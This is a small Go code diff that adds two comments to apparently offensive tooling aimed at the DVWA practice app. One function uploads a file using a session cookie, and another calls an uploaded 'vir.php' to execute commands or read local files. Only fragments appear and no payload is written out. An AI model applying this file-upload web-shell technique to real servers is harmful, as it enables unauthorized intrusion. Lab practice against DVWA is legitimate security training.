@@ -10,6 +10,7 @@ import (
 	"strings"
 )
 
+//带cookie注入
 func UpWithCookie(cookstr string,fuckurl string,filepath string) bool{
 	client := &http.Client{};
 	body_buf := &bytes.Buffer{}
@@ -57,6 +58,7 @@ func UpWithCookie(cookstr string,fuckurl string,filepath string) bool{
 	return true
 }
 
+//读取本地文件
 func ExcFileCommand(urlDVWA string,sw *BruteSubWindow){
 	urlVir := urlDVWA + "hackable/uploads/vir.php"
 	client := &http.Client{};
